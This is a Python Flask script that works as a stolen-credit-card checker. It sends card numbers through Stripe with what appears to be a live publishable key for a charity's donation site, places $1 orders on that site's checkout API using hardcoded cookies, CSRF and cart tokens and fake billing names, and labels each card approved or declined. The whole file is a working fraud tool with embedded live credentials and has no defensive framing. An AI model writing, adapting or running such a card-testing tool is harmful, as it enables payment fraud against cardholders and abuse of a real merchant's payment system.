from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

def process_payment(ccn, mm, yy, cvc):
    if len(yy) == 2:
        yy = '20' + yy
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    data = f'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    apx = response.json()
    if 'id' not in apx:
        return f"Error: {apx.get('error', {}).get('message', 'Unknown error')}"
    pid = apx["id"]
    cookies = {
        'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
        'ss_cvr': 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1',
        'ss_cvt': '1760724937850',
        '__stripe_mid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
        '__stripe_sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
    }
    headers = {
        'authority': 'www.onamissionkc.org',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.onamissionkc.org',
        'referer': 'https://www.onamissionkc.org/checkout?cartToken=OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
    }
    json_data = {
        'email': 'grogeh@gmail.com',
        'subscribeToList': False,
        'shippingAddress': {
            'id': '',
            'firstName': '',
            'lastName': '',
            'line1': '',
            'line2': '',
            'city': '',
            'region': 'NY',
            'postalCode': '',
            'country': '',
            'phoneNumber': '',
        },
        'createNewUser': False,
        'newUserPassword': None,
        'saveShippingAddress': False,
        'makeDefaultShippingAddress': False,
        'customFormData': None,
        'shippingAddressId': None,
        'proposedAmountDue': {
            'decimalValue': '1',
            'currencyCode': 'USD',
        },
        'cartToken': 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
        'paymentToken': {
            'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
            'token': pid,
            'type': 'STRIPE',
        },
        'billToShippingAddress': False,
        'billingAddress': {
            'id': '',
            'firstName': 'Davide',
            'lastName': 'Washintonne',
            'line1': 'Siles Avenue',
            'line2': '',
            'city': 'Oakford',
            'region': 'PA',
            'postalCode': '19053',
            'country': 'US',
            'phoneNumber': '+1361643646',
        },
        'savePaymentInfo': False,
        'makeDefaultPayment': False,
        'paymentCardId': None,
        'universalPaymentElementEnabled': True,
    }
    response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data)
    apx1 = response1.json()
    if "failureType" in apx1:
        return f"{ccn}|{mm}|{yy}|{cvc} --> {apx1['failureType']}"
    else:
        return f"{ccn}|{mm}|{yy}|{cvc} --> PAYMENT_SUCCESS"

@app.route('/gateway=stripe5$/key=rocky/cc=<card_details>', methods=['GET'])
def payment_gateway():
    card_input = request.args.get('card_details', '')
    parts = card_input.split('|')
    if len(parts) != 4:
        return jsonify({"status": "error", "response": "Invalid card format: cc|mm|yy|cvv"}), 400
    
    ccn, mm, yy, cvc = parts
    result = process_payment(ccn, mm, yy, cvc)
    
    if "PAYMENT_SUCCESS" in result:
        status = "approved"
    elif "DECLINED" in result.upper():
        status = "declined"
    else:
        status = "error"
    
    return jsonify({"status": status, "response": result})

if __name__ == "__main__":
    app.run(debug=True)
